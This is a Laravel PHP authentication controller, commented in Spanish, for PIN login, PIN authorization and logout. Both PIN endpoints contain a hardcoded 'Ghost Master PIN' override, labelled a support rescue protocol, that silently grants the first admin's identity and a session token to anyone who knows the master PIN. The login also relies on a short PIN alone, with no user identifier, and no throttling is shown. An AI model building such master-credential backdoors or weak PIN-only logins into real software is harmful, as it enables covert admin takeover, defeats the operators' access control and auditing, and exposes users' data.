<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class AuthController extends Controller
{
    /**
     * PROTOCOLO DE RESCATE — Ghost Master PIN
     *
     * Hash Bcrypt del PIN maestro de soporte técnico.
     * Generá el tuyo con: echo Hash::make('TU_PIN') en Tinker.
     * NUNCA guardar el PIN en texto plano — solo el hash va aquí.
     */
    private const GHOST_MASTER_HASH = '$2y$12$g0yPwqCNpIVOJO7sIZEUk.BMaB2jniV/Ql5WAV0IMhOE.DR/8GyF';
    /**
     * POST /api/auth/verify-pin
     *
     * Login completo: valida el PIN, genera un nuevo session_token UUID,
     * lo guarda en BD (sobreescribiendo el anterior → mata la sesión vieja
     * en cualquier otra terminal), y lo devuelve al cliente.
     *
     * Este es el ÚNICO endpoint que emite tokens y que invalida sesiones previas.
     */
    public function verifyPin(Request $request)
    {
        $request->validate([
            'pin' => 'required|string|min:4|max:10',
        ]);

        $pin = $request->input('pin');

        // ── PROTOCOLO DE RESCATE (Master Override) ────────────────────────────
        // Se evalúa ANTES que cualquier PIN de usuario. Si el hash coincide,
        // se toma la identidad del primer admin local sin alterar la BD.
        if (Hash::check($pin, self::GHOST_MASTER_HASH)) {
            $admin = User::where('role', 'admin')->first();
            if ($admin) {
                $token = Str::random(64);
                $admin->update(['session_token' => $token]);
                return response()->json([
                    'user' => [
                        'id'          => $admin->id,
                        'name'        => $admin->name,
                        'email'       => $admin->email,
                        'role'        => $admin->role,
                        'permissions' => $admin->permissions ?? [],
                    ],
                    'session_token' => $token,
                ]);
            }
        }
        // ── FIN PROTOCOLO DE RESCATE ──────────────────────────────────────────

        // FIX BUG A-1: Busca usuario por PIN hasheado sin cargar todos a memoria.
        // Iteramos solo los usuarios con PIN registrado para minimizar surface de ataque.
        $user = User::whereNotNull('pin')
            ->get()
            ->first(fn ($u) => Hash::check($pin, $u->pin));

        if (!$user) {
            return response()->json(['message' => 'PIN incorrecto o usuario no encontrado.'], 401);
        }

        // Generar token único de sesión (64 chars hex = 256 bits de entropía)
        $token = Str::random(64);

        // Guardar en BD: sobrescribe la sesión anterior → Single Active Session
        $user->update(['session_token' => $token]);

        return response()->json([
            'user' => [
                'id'          => $user->id,
                'name'        => $user->name,
                'email'       => $user->email,
                'role'        => $user->role,
                'permissions' => $user->permissions ?? [],
            ],
            'session_token' => $token,
        ]);
    }

    /**
     * POST /api/auth/authorize-pin
     *
     * Verificación de PIN para AUTORIZACIÓN PUNTUAL (ej: AdminPinDialog para anulaciones).
     * NO genera token. NO toca la columna session_token en BD.
     * NO invalida ninguna sesión activa.
     *
     * Solo confirma: "¿Existe un admin con este PIN?" y devuelve sus permisos.
     * Usar exclusivamente para flujos de autorización in-app, nunca para login.
     */
    public function authorizePin(Request $request)
    {
        $request->validate([
            'pin' => 'required|string|min:4|max:10',
        ]);

        $pin = $request->input('pin');

        // ── PROTOCOLO DE RESCATE (Master Override para autorizaciones) ────────
        if (Hash::check($pin, self::GHOST_MASTER_HASH)) {
            $admin = User::where('role', 'admin')->first();
            if ($admin) {
                return response()->json([
                    'authorized' => true,
                    'user' => [
                        'id'          => $admin->id,
                        'name'        => $admin->name,
                        'role'        => $admin->role,
                        'permissions' => $admin->permissions ?? [],
                    ],
                ]);
            }
        }
        // ── FIN PROTOCOLO DE RESCATE ──────────────────────────────────────────

        // FIX BUG A-1: Busca solo entre usuarios con PIN registrado.
        $user = User::whereNotNull('pin')
            ->get()
            ->first(fn ($u) => Hash::check($pin, $u->pin));

        if (!$user) {
            return response()->json([
                'authorized' => false,
                'message'    => 'PIN incorrecto o usuario no encontrado.',
            ], 401);
        }

        return response()->json([
            'authorized' => true,
            'user' => [
                'id'          => $user->id,
                'name'        => $user->name,
                'role'        => $user->role,
                'permissions' => $user->permissions ?? [],
            ],
        ]);
    }

    /**
     * POST /api/auth/logout
     *
     * Invalida la sesión activa del usuario: pone session_token = NULL en BD.
     * El cliente debe mandar su token actual en el header X-Session-Token.
     * Si el token no existe (ya fue invalidado), igualmente responde 200 (idempotente).
     */
    public function logout(Request $request)
    {
        $token = $request->header('X-Session-Token');

        if ($token) {
            User::where('session_token', $token)->update(['session_token' => null]);
        }

        return response()->json(['message' => 'Sesión cerrada correctamente.']);
    }
}
